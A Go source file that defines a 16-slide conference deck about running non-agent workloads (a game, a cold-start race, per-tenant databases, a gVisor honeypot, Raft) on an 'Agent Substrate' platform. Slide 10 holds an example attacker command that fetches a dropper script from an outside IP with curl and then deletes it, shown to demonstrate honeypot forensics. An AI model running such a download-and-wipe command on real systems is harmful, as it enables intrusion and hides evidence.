// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// SlideCard defines a numbered pillar card for the official ASD 3-Cards layout.
type SlideCard struct {
	Number string `json:"number"`
	Title  string `json:"title"`
	Body   string `json:"body"`
}

// SlideColumn defines a side-by-side comparison column for the official ASD Two-Column layout.
type SlideColumn struct {
	Heading string   `json:"heading"`
	Bullets []string `json:"bullets"`
}

// SlideAgendaItem defines a numbered row for the official ASD Agenda / Synthesis layout.
type SlideAgendaItem struct {
	Number string `json:"number"`
	Topic  string `json:"topic"`
	Detail string `json:"detail,omitempty"`
}

// SlidePuzzlePiece defines one slot in the 3x3 interlocking Agent Substrate jigsaw puzzle.
type SlidePuzzlePiece struct {
	Slot        int    `json:"slot"` // 0..8 in row-major 3x3 order (4 is the center keystone)
	Code        string `json:"code"`
	Kind        string `json:"kind"` // "demo" | "substrate" | "keystone"
	Filled      bool   `json:"filled"`
	Face        string `json:"face"` // "rebel" | "agent" | "extra" | "keystone"
	Badge       string `json:"badge"`
	RebelTitle  string `json:"rebel_title,omitempty"`
	RebelDetail string `json:"rebel_detail,omitempty"`
	AgentTitle  string `json:"agent_title"`
	AgentDetail string `json:"agent_detail"`
	EmptyLabel  string `json:"empty_label,omitempty"`
}

// SlideDef defines the static metadata and Agent Substrate Day template content for a slide.
type SlideDef struct {
	ID                string             `json:"id"`
	Index             int                `json:"index"`
	Total             int                `json:"total"`
	Layout            string             `json:"layout"` // "asd-title" | "asd-demo" | "asd-cards" | "asd-two-col" | "asd-big-stat" | "asd-code" | "asd-puzzle" | "asd-closing"
	Kicker            string             `json:"kicker"`
	Chapter           string             `json:"chapter"`
	Badge             string             `json:"badge"`
	Title             string             `json:"title"`
	Subtitle          string             `json:"subtitle"`
	Kind              string             `json:"kind"` // "title" | "chapter" | "recap" | "puzzle" | "closer"
	HighlightPhrases  []string           `json:"highlight_phrases,omitempty"`
	SpeakerByline     string             `json:"speaker_byline,omitempty"`
	EventFooter       string             `json:"event_footer,omitempty"`
	Points            []string           `json:"points"`
	Cards             []SlideCard        `json:"cards,omitempty"`
	Columns           []SlideColumn      `json:"columns,omitempty"`
	StatValue         string             `json:"stat_value,omitempty"`
	StatContext       string             `json:"stat_context,omitempty"`
	CodeFilename      string             `json:"code_filename,omitempty"`
	CodeLines         []string           `json:"code_lines,omitempty"`
	PuzzleStage       string             `json:"puzzle_stage,omitempty"` // "loot" | "epiphany" | "complete"
	PuzzlePieces      []SlidePuzzlePiece `json:"puzzle_pieces,omitempty"`
	AgendaItems       []SlideAgendaItem  `json:"agenda_items,omitempty"`
	SignOffLines      []string           `json:"sign_off_lines,omitempty"`
	DemoName          string             `json:"demo_name,omitempty"`
	DemoURL           string             `json:"demo_url,omitempty"`
	SubstrateFeatures []string           `json:"substrate_features"`
	SpeakerNotes      string             `json:"speaker_notes"`
}

// SlideData combines static slide metadata with live in-memory Go heap state.
type SlideData struct {
	SlideDef
	ViewCount    int       `json:"view_count"`
	Notes        string    `json:"notes"`
	PodIPHistory []string  `json:"pod_ip_history"`
	CurrentPodIP string    `json:"current_pod_ip"`
	LastWokenAt  time.Time `json:"last_woken_at"`
}

// SlideSummary is a compact representation for the slide grid.
type SlideSummary struct {
	ID      string `json:"id"`
	Index   int    `json:"index"`
	Total   int    `json:"total"`
	Layout  string `json:"layout"`
	Chapter string `json:"chapter"`
	Badge   string `json:"badge"`
	Title   string `json:"title"`
	Kind    string `json:"kind"`
}

// buildPuzzlePieces returns the 9-slot (3x3) Agent Substrate jigsaw puzzle state for a finale stage.
// Slots 0, 1, 2, 3, 5 are the 5 non-agent demo pieces; slots 6, 7, 8 are built-in Agent Substrate
// security/platform pieces; slot 4 (center bullseye) is the Model + Agent Loop keystone.
func buildPuzzlePieces(stage string) []SlidePuzzlePiece {
	demoFace := "rebel"
	if stage == "epiphany" || stage == "complete" {
		demoFace = "agent"
	}
	fillExtras := stage == "complete"

	emptyCenter := "Missing centerpiece"
	emptyS1 := "Unclaimed slot"
	emptyS2 := "Unclaimed slot"
	emptyS3 := "Unclaimed slot"
	if stage == "epiphany" {
		emptyCenter = "What drives the loop?"
		emptyS1 = "Outbound network guard?"
		emptyS2 = "Keep API keys out of RAM?"
		emptyS3 = "Tenant authz & VM options?"
	}

	return []SlidePuzzlePiece{
		{
			Slot:        0,
			Code:        "01",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 01 • DUNGEON 2D",
			RebelTitle:  "RAM checkpoints, undo & fork",
			RebelDetail: "SNAPSHOT_FIDELITY_MEMORY • revert • --tag",
			AgentTitle:  "Working memory & branching",
			AgentDetail: "Roll back bad tool calls & fork plans",
		},
		{
			Slot:        1,
			Code:        "02",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 02 • COLDSTART",
			RebelTitle:  "12s index cloned in ~100ms",
			RebelDetail: "ActorTemplate + wakeupProbe goldenTag",
			AgentTitle:  "100ms warm toolchains",
			AgentDetail: "Python, Node, browser & repo index ready",
		},
		{
			Slot:        2,
			Code:        "03",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 03 • TENANTDB",
			RebelTitle:  "Isolated DB per customer",
			RebelDetail: "DurableDir /data • tiered suspend • delete",
			AgentTitle:  "Private /workspace per session",
			AgentDetail: "Burst for 5s, sleep in GCS while idle",
		},
		{
			Slot:        3,
			Code:        "04",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 04 • HONEYPOT",
			RebelTitle:  "Sandboxed /bin/sh & rewind",
			RebelDetail: "gVisor Sentry kernel • rootfs revert",
			AgentTitle:  "Safe untrusted code execution",
			AgentDetail: "Contain prompt injection & undo rm -rf",
		},
		{
			Slot:        4,
			Code:        "AI",
			Kind:        "keystone",
			Filled:      fillExtras,
			Face:        "keystone",
			Badge:       "YOU BRING THIS",
			AgentTitle:  "Model + agent loop",
			AgentDetail: "Gemini, Claude, or open weights + tools",
			EmptyLabel:  emptyCenter,
		},
		{
			Slot:        5,
			Code:        "05",
			Kind:        "demo",
			Filled:      true,
			Face:        demoFace,
			Badge:       "PIECE 05 • TIMEWARP",
			RebelTitle:  "Turn-based wake & long waits",
			RebelDetail: "atenet request parking • indefinite sleep",
			AgentTitle:  "Human-paced agent turns",
			AgentDetail: "Wait minutes or days for the next reply",
		},
		{
			Slot:        6,
			Code:        "S1",
			Kind:        "substrate",
			Filled:      fillExtras,
			Face:        "extra",
			Badge:       "ALSO IN SUBSTRATE",
			AgentTitle:  "ActorEgressPolicy firewall",
			AgentDetail: "Deny-by-default L7 & DNS egress rules",
			EmptyLabel:  emptyS1,
		},
		{
			Slot:        7,
			Code:        "S2",
			Kind:        "substrate",
			Filled:      fillExtras,
			Face:        "extra",
			Badge:       "ALSO IN SUBSTRATE",
			AgentTitle:  "ate-secret:// MITM auth",
			AgentDetail: "Inject API keys on egress, 0 keys in RAM",
			EmptyLabel:  emptyS2,
		},
		{
			Slot:        8,
			Code:        "S3",
			Kind:        "substrate",
			Filled:      fillExtras,
			Face:        "extra",
			Badge:       "ALSO IN SUBSTRATE",
			AgentTitle:  "OpenFGA, microVM & CSI",
			AgentDetail: "Per-tenant AccessPolicy, Kata & volumes",
			EmptyLabel:  emptyS3,
		},
	}
}

// AllSlideDefs returns the full 16-slide presentation deck definitions styled
// after the official Agent Substrate Day (ATECon) speaker template.
func AllSlideDefs() []SlideDef {
	total := 16
	eventLine := "ATECon  •  Monday, November 9, 2026  •  Sky SLC"
	return []SlideDef{
		{
			ID:               "slide-01",
			Index:            1,
			Total:            total,
			Layout:           "asd-title",
			Kicker:           "AGENT SUBSTRATE DAY",
			Chapter:          "Welcome",
			Badge:            "AGENT SUBSTRATE DAY",
			Title:            "Running anything *but* agents on Agent Substrate",
			Subtitle:         "",
			Kind:             "title",
			HighlightPhrases: []string{"*but*"},
			SpeakerByline:    "Mofi Rahman  •  Lead DevRel GKE, Google Cloud",
			EventFooter:      eventLine,
			Points: []string{
				"Running anything *but* agents on Agent Substrate",
				"Mofi Rahman, Lead DevRel GKE, Google Cloud",
				"ATECon • Monday, November 9, 2026 • Sky SLC",
			},
			SubstrateFeatures: []string{
				"Agent Substrate",
				"Kubernetes-Native Actors",
				"gVisor Sandbox",
			},
			SpeakerNotes: "Welcome slide while taking the stage. Introduce yourself and the talk title with Yolo on screen, then advance to Slide 2 to set up the five non-agent demos.",
		},
		{
			ID:               "slide-02",
			Index:            2,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "AGENT SUBSTRATE DAY  •  REBEL TRACK",
			Chapter:          "Cold open",
			Badge:            "REBEL TRACK",
			Title:            "Every talk is about agents, so let's run *anything else*",
			Subtitle:         "Every session today covers agents or how Substrate runs them. Let's run five non-AI workloads instead.",
			Kind:             "chapter",
			HighlightPhrases: []string{"*anything else*", "3-pod WorkerPool"},
			Points: []string{
				"A 2D game, HPA cold-start race, customer DBs, SSH honeypot, and Raft cluster.",
				"All five workloads share one 3-pod WorkerPool with 1 vCPU per pod.",
				"After each demo, we keep the Substrate feature that made it work.",
			},
			DemoName: "Open Dungeon 2D dashboard",
			DemoURL:  "https://dungeon.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"WorkerPool (ate.dev/v1)",
				"Pod-Decoupled Identity",
				"gVisor Sandbox",
				"atenet Wake-on-HTTP",
			},
			SpeakerNotes: "Open as the conference rebel: every other session today is about agents or how Agent Substrate runs agents, so let's build five workloads that have nothing to do with AI. Keep the surprise that this slide deck is also running on Substrate until the end! Press Q to pop the audience QR code.",
		},
		{
			ID:               "slide-03",
			Index:            3,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 01  •  DUNGEON 2D",
			Chapter:          "Demo 01 • Setup",
			Badge:            "LIVE DEMO 01",
			Title:            "I was too lazy to set up Postgres",
			Subtitle:         "An 8-floor multiplayer roguelike on 3 pods with all server state in Go memory.",
			Kind:             "chapter",
			HighlightPhrases: []string{"Go heap structs", "Save Shrine"},
			Points: []string{
				"Player HP, inventory, and boss health live in Go heap structs.",
				"The server imports no SQL driver and writes nothing to disk.",
				"Idle players sleep in Cloud Storage and wake in ~100ms at a Save Shrine.",
			},
			DemoName: "Launch Dungeon 2D live demo",
			DemoURL:  "https://dungeon.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"SNAPSHOT_FIDELITY_MEMORY",
				"atenet-router",
				"In-Memory Persistence",
			},
			SpeakerNotes: "First experiment: a multiplayer game with save points, boss-death undo, and forked save slots without a database. Point out dozens of players sharing 3 pods.",
		},
		{
			ID:               "slide-04",
			Index:            4,
			Total:            total,
			Layout:           "asd-cards",
			Kicker:           "PUZZLE PIECE 01 / 05  •  MEMORY SNAPSHOTS",
			Chapter:          "Piece 01 • Memory",
			Badge:            "PIECE 01 / 05",
			Title:            "Checkpoint RAM, undo mistakes, and branch state",
			Subtitle:         "Durable process memory lets lifecycle commands replace custom save and rollback code.",
			Kind:             "recap",
			HighlightPhrases: []string{"SNAPSHOT_FIDELITY_MEMORY", "kubectl ate revert", "kubectl ate create tag"},
			Points: []string{
				"SNAPSHOT_FIDELITY_MEMORY saves live RAM to Cloud Storage on idle and wakes on any pod in ~100ms.",
				"kubectl ate revert actor restores the prior memory snapshot after dying on Floor 8.",
				"kubectl ate create tag clones a saved snapshot into a second actor so one key opens both chests.",
			},
			Cards: []SlideCard{
				{
					Number: "01",
					Title:  "Freeze the Go heap",
					Body:   "SNAPSHOT_FIDELITY_MEMORY saves live RAM to Cloud Storage on idle and wakes on any pod in ~100ms.",
				},
				{
					Number: "02",
					Title:  "Rewind a bad turn",
					Body:   "kubectl ate revert actor restores the prior memory snapshot after the Floor 8 dragon kills us.",
				},
				{
					Number: "03",
					Title:  "Fork a new timeline",
					Body:   "kubectl ate create tag clones a saved snapshot into a second actor so one key opens both chests.",
				},
			},
			DemoName: "Revisit Dungeon 2D leaderboard",
			DemoURL:  "https://dungeon.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"SNAPSHOT_FIDELITY_MEMORY",
				"atenet Wake-on-HTTP",
				"kubectl ate revert",
				"kubectl ate create tag",
			},
			SpeakerNotes: "Pocket Piece #1: process memory checkpointing, revert, and tag branching. Next experiment: racing Kubernetes HPA.",
		},
		{
			ID:               "slide-05",
			Index:            5,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 02  •  COLDSTART HPA RACE",
			Chapter:          "Demo 02 • Setup",
			Badge:            "LIVE DEMO 02",
			Title:            "Racing Kubernetes HPA on a 12-second cold start",
			Subtitle:         "Traffic jumps from 20 to 60 QPS across identical 2-hop L7 routers.",
			Kind:             "chapter",
			HighlightPhrases: []string{"12 seconds", "0/1 NotReady", "HTTP 429"},
			Points: []string{
				"Each replica takes 12 seconds to build a 50,000-doc search index in RAM.",
				"Scale-out Kubernetes pods fail readinessProbe and stay 0/1 NotReady.",
				"Excluded from Service Endpoints, Pod 1 caps at 20 QPS and sheds HTTP 429.",
			},
			DemoName: "Open Cold-Start HPA race",
			DemoURL:  "https://coldstart.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"ActorTemplate",
				"wakeupProbe",
				"Golden Snapshots",
				"external.metrics.k8s.io",
			},
			SpeakerNotes: "When traffic spikes from 20 to 60 QPS, HPA adds pods, but those new pods fail their readinessProbe and stay 0/1 NotReady for 12 seconds while Pod 1 sheds traffic with HTTP 429.",
		},
		{
			ID:               "slide-06",
			Index:            6,
			Total:            total,
			Layout:           "asd-two-col",
			Kicker:           "PUZZLE PIECE 02 / 05  •  GOLDEN SNAPSHOTS",
			Chapter:          "Piece 02 • Warm Clone",
			Badge:            "PIECE 02 / 05",
			Title:            "Build the index once, clone warm RAM in ~100ms",
			Subtitle:         "ActorTemplate snapshots post-warmup memory once so scale-out replicas skip cold init.",
			Kind:             "recap",
			HighlightPhrases: []string{"goldenTag", "~100ms", "0/1 NotReady"},
			Points: []string{
				"ActorTemplate runs the 12-second warmup once and saves the 76.6 MB heap to goldenTag when /readyz returns 200.",
				"Scaling from 1 to 3 restores pre-warmed replicas in ~100ms instead of rebuilding the index.",
				"The service absorbs the full 60 QPS spike without dropping requests.",
			},
			Columns: []SlideColumn{
				{
					Heading: "Standard Kubernetes HPA",
					Bullets: []string{
						"Rebuilds the 12-second search index on every scale-out.",
						"New pods fail readinessProbe and stay 0/1 NotReady.",
						"Pod 1 drops roughly half of user queries with HTTP 429.",
					},
				},
				{
					Heading: "Substrate Golden Snapshots",
					Bullets: []string{
						"Runs the 12-second warmup once when registering the template.",
						"Saves the warm 76.6 MB heap to goldenTag when /readyz hits 200.",
						"Clones Ready replicas in ~100ms and serves all 60 QPS.",
					},
				},
			},
			DemoName: "Revisit Cold-Start oscilloscope",
			DemoURL:  "https://coldstart.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"ActorTemplate Golden Snapshots",
				"wakeupProbe /readyz",
				"Warm Heap Cloning",
				"Pod-Decoupled Scaling",
			},
			SpeakerNotes: "Pocket Piece #2: ActorTemplate + wakeupProbe Golden Snapshots. Cloning 76 MB of read-only RAM is great, so next let's look at per-customer writable storage.",
		},
		{
			ID:               "slide-07",
			Index:            7,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 03  •  ONE DB PER CUSTOMER",
			Chapter:          "Demo 03 • Setup",
			Badge:            "LIVE DEMO 03",
			Title:            "One isolated database process per customer",
			Subtitle:         "Four customer databases multiplex across 3 worker pods without shared tables.",
			Kind:             "chapter",
			HighlightPhrases: []string{"WHERE tenant_id", "kubectl ate delete actor"},
			Points: []string{
				"Acme, Globex, Initech, and Umbrella each run a private DB with a 16 MB cache.",
				"Queries skip WHERE tenant_id filters because tenants share no process or disk.",
				"GDPR tenant deletion takes one kubectl ate delete actor command.",
			},
			DemoName: "Open TenantDB X-Ray console",
			DemoURL:  "https://tenantdb.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"DurableDir (/data)",
				"suspend --mode=async",
				"suspend --mode=sync",
				"kubectl ate delete actor",
			},
			SpeakerNotes: "Shared multi-tenant tables mean worrying about missing WHERE tenant_id filters and complex GDPR deletes across dozens of tables. Here each customer gets an isolated database binary sharing our 3 pods.",
		},
		{
			ID:               "slide-08",
			Index:            8,
			Total:            total,
			Layout:           "asd-big-stat",
			Kicker:           "PUZZLE PIECE 03 / 05  •  DURABLEDIR & TIERING",
			Chapter:          "Piece 03 • Workspaces",
			Badge:            "PIECE 03 / 05",
			Title:            "Snapshot bytes saved by dropping cache RAM on sleep",
			Subtitle:         "Private /data volumes keep hot caches in RAM during bursts and commit compact logs overnight.",
			Kind:             "recap",
			StatValue:        "99.997%",
			StatContext:      "Sync suspend commits only the 480 B /data/wal.jsonl log instead of the 16.0 MB cache, then replays it in <1ms on wake.",
			HighlightPhrases: []string{"16.0 MB", "480 B", "kubectl ate delete actor"},
			Points: []string{
				"Async suspend keeps the 16.0 MB buffer pool in the snapshot for active bursts.",
				"Sync suspend drops the cache and commits only 480 B /data/wal.jsonl in DurableDir.",
				"kubectl ate delete actor removes compute, RAM snapshots, and /data together.",
			},
			DemoName: "Revisit TenantDB console",
			DemoURL:  "https://tenantdb.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"DurableDir (/data)",
				"MEMORY vs VOLUMES Fidelity",
				"WAL Replay (<1ms)",
				"Single-Command Tenant Delete",
			},
			SpeakerNotes: "Pocket Piece #3: DurableDir volumes, SNAPSHOT_FIDELITY_MEMORY (db-acme/db-globex) vs. native SNAPSHOT_FIDELITY_VOLUMES (db-initech/db-umbrella), and single-command tenant deletion. Now what if the user is an attacker?",
		},
		{
			ID:               "slide-09",
			Index:            9,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 04  •  GVISOR HONEYPOT",
			Chapter:          "Demo 04 • Setup",
			Badge:            "LIVE DEMO 04",
			Title:            "A disposable Linux sandbox per attacker IP",
			Subtitle:         "Each suspicious IP gets real /bin/sh while the SOC watches from outside.",
			Kind:             "chapter",
			HighlightPhrases: []string{"gVisor Sentry", "rm -f"},
			Points: []string{
				"Every attacker IP wakes an isolated Debian actor that sleeps while idle.",
				"gVisor Sentry intercepts syscalls while forensics hashes dropped files.",
				"When an attacker runs rm -f to hide, we rewind the rootfs snapshot.",
			},
			DemoName: "Open Honeypot console",
			DemoURL:  "https://honeypot.substrate.learngke.dev/",
			SubstrateFeatures: []string{
				"sandboxClasses: [gvisor]",
				"Rootfs Overlay Snapshots",
				"Out-of-Band Forensics",
			},
			SpeakerNotes: "Dedicated VMs cost too much to leave idle per IP, and fake shell emulators are easy to spot. Here every attacker IP gets a real Linux environment inside gVisor.",
		},
		{
			ID:           "slide-10",
			Index:        10,
			Total:        total,
			Layout:       "asd-code",
			Kicker:       "PUZZLE PIECE 04 / 05  •  GVISOR & FORENSICS",
			Chapter:      "Piece 04 • Sandbox",
			Badge:        "PIECE 04 / 05",
			Title:        "Isolate untrusted shells and rewind deleted files",
			Subtitle:     "Run real /bin/sh inside gVisor, recover wiped evidence, and clone a live sandbox.",
			Kind:         "recap",
			CodeFilename: "forensic-playbook.sh",
			CodeLines: []string{
				"# Attacker drops a script inside gVisor, then tries to wipe the evidence:",
				"attacker@honeypot$ curl -sO http://198.51.100.9/dropper.sh && rm -f dropper.sh",
				"",
				"# Defender rewinds the actor's rootfs and RAM snapshot to recover dropper.sh:",
				"defender@cluster$ kubectl ate revert actor honeypot-203-0-113-5",
				"",
				"# Defender clones the compromised actor onto a tag without alerting the attacker:",
				"defender@cluster$ kubectl ate create tag crime-scene --actor honeypot-203-0-113-5",
				"defender@cluster$ kubectl ate create actor forensic-lab --template honeypot --tag crime-scene",
			},
			HighlightPhrases: []string{"gVisor", "kubectl ate revert", "create tag"},
			Points: []string{
				"gVisor runs untrusted Linux binaries inside a user-space kernel rather than directly on the node kernel.",
				"Rootfs overlay snapshots carry /tmp edits across worker pods without attaching a PVC.",
				"kubectl ate revert recovers deleted files, and create tag clones the sandbox for safe inspection.",
			},
			DemoName: "Revisit Honeypot console",
			DemoURL:  "https://honeypot.substrate.learngke.dev/",
			SubstrateFeatures: []string{
				"gVisor Application Kernel",
				"Rootfs Overlay Snapshots",
				"kubectl ate revert",
				"Forensic Tag Cloning (--tag)",
			},
			SpeakerNotes: "Pocket Piece #4: gVisor sandboxing and rootfs rollback. Notice the rose attacker command inside the sandbox versus our green defender commands on the cluster. (Q&A tip: SOC Director View also has Crash PID 1 -> STATE=CRASHED revert and Preset #5 Egress Block + ate-secret://.) Next, let's see what breaks when we freeze Raft.",
		},
		{
			ID:               "slide-11",
			Index:            11,
			Total:            total,
			Layout:           "asd-demo",
			Kicker:           "LIVE DEMO 05  •  TESTING THE LIMITS",
			Chapter:          "Demo 05 • Setup",
			Badge:            "LIVE DEMO 05",
			Title:            "Putting a Raft leader in the freezer",
			Subtitle:         "We replaced Postgres, beat HPA, and trapped hackers. Now let's freeze Raft.",
			Kind:             "chapter",
			HighlightPhrases: []string{"3-second lease", "split-brain"},
			Points: []string{
				"We suspend raft-node-1 while it holds the Term 1 leader lease.",
				"Wall time moves on, its 3-second lease expires, and node 2 wins Term 2.",
				"Waking 5s later on a write, node 1 serves conflicting split-brain writes.",
			},
			DemoName: "Open Timewarp split-brain lab",
			DemoURL:  "https://timewarp.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"atenet Request Parking",
				"Wall-Clock Discontinuity",
				"Turn-Based vs Heartbeat",
			},
			SpeakerNotes: "You don't understand a tool until you find where it breaks. Let's freeze the leader of a 3-node Raft cluster, watch it split-brain, and see what workload shape Substrate actually wants.",
		},
		{
			ID:               "slide-12",
			Index:            12,
			Total:            total,
			Layout:           "asd-two-col",
			Kicker:           "PUZZLE PIECE 05 / 05  •  TURN-BASED EXECUTION",
			Chapter:          "Piece 05 • Turn-Based",
			Badge:            "PIECE 05 / 05",
			Title:            "Built for discrete turns, not continuous heartbeats",
			Subtitle:         "Freezing Raft shows the workload shape Substrate fits best, short turns with long idle waits.",
			Kind:             "recap",
			HighlightPhrases: []string{"atenet", "StatefulSets", "wait indefinitely"},
			Points: []string{
				"Heartbeat daemons assume continuous clocks and break when frozen across lease timeouts.",
				"Turn-based workloads run one request, suspend cleanly, and can wait indefinitely in Cloud Storage.",
				"atenet parks the next incoming HTTP request and wakes the sleeping actor in ~100ms.",
			},
			Columns: []SlideColumn{
				{
					Heading: "Continuous Heartbeat Daemons",
					Bullets: []string{
						"Expect unbroken 100ms ticks and short leader leases.",
						"Freezing memory pauses monotonic timers while wall time advances.",
						"Keep etcd, Raft, and Kafka on Kubernetes StatefulSets.",
					},
				},
				{
					Heading: "Turn-Based Workloads",
					Bullets: []string{
						"Run a burst of work, then suspend as soon as the turn ends.",
						"Can wait indefinitely in Cloud Storage without holding a pod.",
						"atenet parks the next HTTP request and wakes the actor in ~100ms.",
					},
				},
			},
			DemoName: "Revisit Timewarp lab",
			DemoURL:  "https://timewarp.substrate.learngke.dev/dashboard",
			SubstrateFeatures: []string{
				"atenet Wake-on-HTTP",
				"Request Parking",
				"Indefinite Idle Sleep",
			},
			SpeakerNotes: "Pocket Piece #5: Substrate is not for continuous heartbeat daemons; it is built for turn-based workloads that do a unit of work and then wait indefinitely until the next request arrives. Now let's put all five pieces on the board.",
		},
		{
			ID:               "slide-13",
			Index:            13,
			Total:            total,
			Layout:           "asd-puzzle",
			Kicker:           "THE REBEL LOOT  •  FIVE NON-AI DEMOS",
			Chapter:          "Finale 1 • Rebel Loot",
			Badge:            "5 PIECES COLLECTED",
			Title:            "Five Substrate features we used without a single agent",
			Subtitle:         "Put all five features from our demos on the board, and ask what else needs all five at once.",
			Kind:             "puzzle",
			PuzzleStage:      "loot",
			PuzzlePieces:     buildPuzzlePieces("loot"),
			HighlightPhrases: []string{"Five Substrate features", "all five at once"},
			Points: []string{
				"Dungeon 2D used SNAPSHOT_FIDELITY_MEMORY, revert, and tag branching.",
				"Coldstart used ActorTemplate Golden Snapshots to clone warm RAM in ~100ms.",
				"TenantDB used isolated DurableDir /data volumes and tiered suspend.",
				"Honeypot used gVisor syscall isolation and rootfs rollback.",
				"Timewarp showed that Substrate fits turn-based workloads that wait indefinitely between requests.",
			},
			SubstrateFeatures: []string{
				"SNAPSHOT_FIDELITY_MEMORY",
				"Golden Snapshots",
				"DurableDir + gVisor + atenet",
			},
			SpeakerNotes: "Pause before the punchline. Read off the five features we pulled from our non-agent demos, including our realization from Timewarp that this runtime is built for turn-based workloads with indefinite waits between turns. Ask the room: what workload needs all five of these together?",
		},
		{
			ID:               "slide-14",
			Index:            14,
			Total:            total,
			Layout:           "asd-puzzle",
			Kicker:           "THE EPIPHANY  •  FLIP THE BOARD",
			Chapter:          "Finale 2 • Epiphany",
			Badge:            "WAIT A SECOND...",
			Title:            "Hold on... every piece we used is what an *agent* needs",
			Subtitle:         "Flip those five non-AI features over. Each one solves a core problem in running production agents.",
			Kind:             "puzzle",
			PuzzleStage:      "epiphany",
			PuzzlePieces:     buildPuzzlePieces("epiphany"),
			HighlightPhrases: []string{"*agent*"},
			Points: []string{
				"Checkpointing and branching let an agent undo a failed tool call or test two plans in parallel.",
				"Golden Snapshots boot Python, Node, browsers, and repo indexes in ~100ms on Turn 1.",
				"DurableDir gives each session an isolated /workspace that costs nothing while idle.",
				"gVisor contains untrusted bash commands and recovers files after a bad rm -rf.",
				"Agents are turn-based workloads that can wait minutes or days for a human reply.",
			},
			SubstrateFeatures: []string{
				"Agent Working Memory",
				"100ms Warm Toolchains",
				"Turn-Based Sandboxes",
			},
			SpeakerNotes: "Watch the five tiles flip over! Checkpointed working memory, 100ms warm toolchains, a private /workspace per session, untrusted bash inside gVisor, and a turn-based lifecycle that can wait indefinitely for a human reply. That is an AI agent! Now look at the four empty slots.",
		},
		{
			ID:               "slide-15",
			Index:            15,
			Total:            total,
			Layout:           "asd-puzzle",
			Kicker:           "COMPLETE PUZZLE  •  SUBSTRATE + YOUR MODEL",
			Chapter:          "Finale 3 • Complete",
			Badge:            "PUZZLE COMPLETE",
			Title:            "Add Substrate's security layer and a *model* to get an agent",
			Subtitle:         "Agent Substrate ships all 8 outer pieces out of the box. You bring the model and agent loop in the center.",
			Kind:             "puzzle",
			PuzzleStage:      "complete",
			PuzzlePieces:     buildPuzzlePieces("complete"),
			HighlightPhrases: []string{"*model*", "8 outer pieces"},
			Points: []string{
				"ActorEgressPolicy enforces deny-by-default L7 HTTP and DNS outbound rules.",
				"ate-secret:// injects API keys at the egress proxy so credentials never enter actor RAM or snapshots.",
				"OpenFGA AccessPolicy, Kata microVMs, and CSI volumes cover multi-tenant auth and storage.",
				"Drop your model and tool loop into the center slot to complete the agent.",
			},
			SubstrateFeatures: []string{
				"ActorEgressPolicy",
				"ate-secret:// MITM Secrets",
				"OpenFGA + microVM + Model",
			},
			SpeakerNotes: "Let the three remaining Substrate pieces animate in one by one: ActorEgressPolicy outbound firewall, ate-secret:// proxy credential injection so API keys never land in GCS memory dumps, and OpenFGA authz plus microVM and CSI options. Pause on the empty center slot, then watch the Model + agent loop drop in! (Q&A tip: Honeypot Preset #5 demonstrates ActorEgressPolicy + ate-secret:// live.)",
		},
		{
			ID:               "slide-16",
			Index:            16,
			Total:            total,
			Layout:           "asd-closing",
			Kicker:           "AGENT SUBSTRATE DAY  •  THANK YOU",
			Chapter:          "Closer • Sign-off",
			Badge:            "ATECON 2026",
			Title:            "Come for the weird demos, stay for the *agents*",
			Subtitle:         "All five demos, the Kubernetes manifests, and this 16-actor slide deck are open source.",
			Kind:             "closer",
			EventFooter:      eventLine,
			HighlightPhrases: []string{"*agents*"},
			Points: []string{
				"Dungeon 2D: working memory that checkpoints, reverts, and branches into parallel timelines.",
				"Coldstart: heavy 12-second runtimes cloned in ~100ms from Golden Snapshots.",
				"TenantDB: isolated per-session /data volumes that burst and then sleep.",
				"Honeypot: untrusted /bin/sh inside gVisor with rootfs rollback.",
				"Timewarp + Egress: turn-based wakeups, indefinite idle waits, ActorEgressPolicy, and ate-secret://.",
			},
			AgendaItems: []SlideAgendaItem{
				{Number: "01", Topic: "Working memory with undo & branching", Detail: "Dungeon 2D  •  SNAPSHOT_FIDELITY_MEMORY, revert, --tag"},
				{Number: "02", Topic: "Heavy runtimes cloned in ~100ms", Detail: "Coldstart  •  ActorTemplate Golden Snapshots"},
				{Number: "03", Topic: "Isolated /data volumes per session", Detail: "TenantDB  •  DurableDir & tiered suspend"},
				{Number: "04", Topic: "Untrusted /bin/sh inside gVisor", Detail: "Honeypot  •  Syscall isolation & rootfs revert"},
				{Number: "05", Topic: "Turn-based wake + egress security + model", Detail: "Timewarp + Egress  •  atenet, ActorEgressPolicy & ate-secret://"},
			},
			SignOffLines: []string{
				"Mofi Rahman  •  Lead DevRel GKE, Google Cloud",
				"@moficodes",
				"github.com/moficodes/anything-but-agents",
			},
			DemoName: "View repo on GitHub",
			DemoURL:  "https://github.com/moficodes/anything-but-agents",
			SubstrateFeatures: []string{
				"Memory Checkpointing",
				"Golden Snapshots",
				"DurableDir Volumes",
				"gVisor + Egress MITM",
				"Turn-Based Wake",
			},
